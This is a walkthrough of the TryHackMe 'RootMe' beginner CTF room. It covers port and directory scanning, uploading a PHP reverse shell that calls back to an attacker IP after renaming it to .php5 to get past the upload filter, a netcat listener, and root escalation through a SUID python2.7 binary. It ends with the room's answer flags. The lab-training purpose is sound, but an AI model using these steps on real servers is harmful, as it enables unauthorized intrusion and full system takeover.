# TryHackMe: RootMe Walkthrough

> **Room:** [https://tryhackme.com/room/rrootme](https://tryhackme.com/room/rrootme)

> A beginner CTF room. Deploy the machine and connect via OpenVPN or AttackBox.

---

## Task 2: Reconnaissance

### Port Scanning

```bash
nmap -Pn -sS -p- <TARGET_IP>
```

| Flag | Purpose |
|------|---------|
| `-Pn` | Skip host discovery (assume host is up) |
| `-sS` | TCP SYN scan (stealth scan, doesn't complete handshake) |
| `-p-` | Scan all 65535 ports |

**Result:** Ports 22 (SSH) and 80 (HTTP) are open.

### Service Version Detection

```bash
nmap -Pn -sV -sS -p22,80 <TARGET_IP>
```

| Flag | Purpose |
|------|---------|
| `-sV` | Probe open ports to determine service/version info |
| `-p22,80` | Only scan specified ports |

**Result:** Apache 2.4.41, OpenSSH 8.2p1.

### Directory Enumeration

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

| Flag | Purpose |
|------|---------|
| `dir` | Directory/file enumeration mode |
| `-u` | Target URL |
| `-w` | Path to wordlist for brute-forcing |

**Result:** Found `/panel/` (upload form) and `/uploads/` directories.

---

## Task 3: Getting a Shell

### 1. Prepare the Reverse Shell

Use the [pentestmonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

```bash
cd /usr/share/webshells/php
nano php-reverse-shell.php
```

Edit the `$ip` and `$port` variables in the script:

```php
$ip = '<YOUR_ATTACKER_IP>';  // CHANGE THIS
$port = 1234;                // CHANGE THIS
```

Set `$ip` to your AttackBox/tun0 IP and `$port` to the port your listener will use (default: 1234).

### 2. Bypass PHP Upload Filter

The server blocks `.php` files. Rename to an alternative extension:

```bash
cp php-reverse-shell.php php-reverse-shell.php5
```

Upload `php-reverse-shell.php5` via the `/panel/` form.

### 3. Start Netcat Listener

```bash
nc -lvnp 1234
```

| Flag | Purpose |
|------|---------|
| `-l` | Listen mode (wait for incoming connection) |
| `-v` | Verbose output |
| `-n` | Numeric only — no DNS resolution |
| `-p` | Specify listening port |

Trigger the shell by clicking the uploaded file in `/uploads/`.

### 4. Upgrade Shell

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

**TTY** (TeleTYpewriter) is a terminal interface that allows interactive input/output — features like tab-completion, arrow keys, and `Ctrl+C` require a TTY. A basic reverse shell doesn't allocate one, so you get a raw, unstable shell.

**PTY** (Pseudo-TeleTY) is a software-emulated terminal. Python's `pty` module creates a pseudo-terminal and spawns `/bin/bash` inside it, upgrading your raw shell into a fully interactive session.

### 5. Find the User Flag

```bash
find / -type f -name "user.txt" 2>/dev/null
cat /var/www/user.txt
```

| Component | Purpose |
|-----------|---------|
| `-type f` | Search for files only |
| `-name "user.txt"` | Match exact filename |
| `2>/dev/null` | Suppress error messages (permission denied, etc.) |

---

## Task 4: Privilege Escalation

### 1. Find SUID Binaries

**SUID** (Set User ID) is a special Unix file permission. When the SUID bit is set on an executable, it runs with the privileges of the file's **owner** (not the user who launched it). If a root-owned binary has SUID set, any user executing it gets root-level access for that process — making misconfigured SUID binaries a common privilege escalation vector.

**How the SUID bit is set:**

```bash
chmod u+s /path/to/binary    # symbolic form
chmod 4755 /path/to/binary   # octal form (4 = SUID prefix)
```

Only root (or a process with `CAP_FOWNER`) can set the SUID bit. It's typically set during package installation for binaries that legitimately need elevated privileges (e.g., `passwd`, `ping`, `sudo`).

**How to spot it:**

```bash
ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root ...
#  ^ 's' instead of 'x' in the owner-execute position means SUID is set
```

> **CAP_FOWNER** is a Linux capability that lets a process bypass permission checks that normally require file ownership (like setting SUID bits, changing file permissions, etc.). Linux capabilities split root's monolithic power into granular units — a process can hold `CAP_FOWNER` without being fully root.

```bash
find / -user root -perm -4000 2>/dev/null
```

| Flag | Purpose |
|------|---------|
| `-user root` | Files owned by root |
| `-perm -4000` | Files with SUID bit set (runs as file owner) |
| `2>/dev/null` | Discard error output |

**Result:** `/usr/bin/python2.7` has SUID — unusual and exploitable.

### 2. Escalate to Root

```bash
python -c 'import os;os.execl("/bin/bash", "sh", "-p")'
```

| Component | Purpose |
|-----------|---------|
| `os.execl()` | Replace current process with a new one |
| `/bin/bash` | Program to execute |
| `"sh"` | argv[0] — name bash sees itself as |
| `"-p"` | Privileged mode — don't drop SUID privileges |

### 3. Get Root Flag

```bash
find / -type f -name "root.txt" 2>/dev/null
cat /root/root.txt
```

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | `THM{y0u_g0t_a_sh3ll}` |
| root.txt | `THM{pr1v1l3g3_3sc4l4t10n}` |
